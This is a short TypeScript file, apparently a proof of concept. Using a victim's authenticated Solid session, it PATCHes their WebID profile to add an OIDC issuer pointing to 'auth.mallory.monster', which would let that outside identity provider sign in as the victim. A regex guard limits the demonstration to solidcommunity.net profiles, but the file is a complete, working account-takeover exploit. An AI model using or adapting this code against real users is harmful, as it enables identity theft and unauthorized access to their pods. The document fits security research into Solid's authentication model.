import { createVocabulary } from 'rdf-vocabulary'
import type { Session } from '@uvdsl/solid-oidc-client-browser'

const malloryOp = 'https://auth.mallory.monster/'
const solid = createVocabulary('http://www.w3.org/ns/solid/terms#', 'oidcIssuer')
const safetyRegex = /^https:\/\/.+\.solidcommunity\.net\/profile\/card#me$/

export async function cuckoo(session: Session): Promise<void> {
  console.log(session.webId)
  if (!session.webId) {
    console.error('Session has no WebID!')
    return
  }
  if (!session.webId.match(safetyRegex)) throw new Error('Unsafe experiment!')
  const body = `INSERT DATA { <${session.webId}> <${solid.oidcIssuer}> <${malloryOp}> . }`
  const { ok } = await session.authFetch(session.webId, {
    method: 'PATCH',
    headers: {
      'Content-Type': 'application/sparql-update',
    },
    body,
  })
  console.log('ok: ', ok)
}
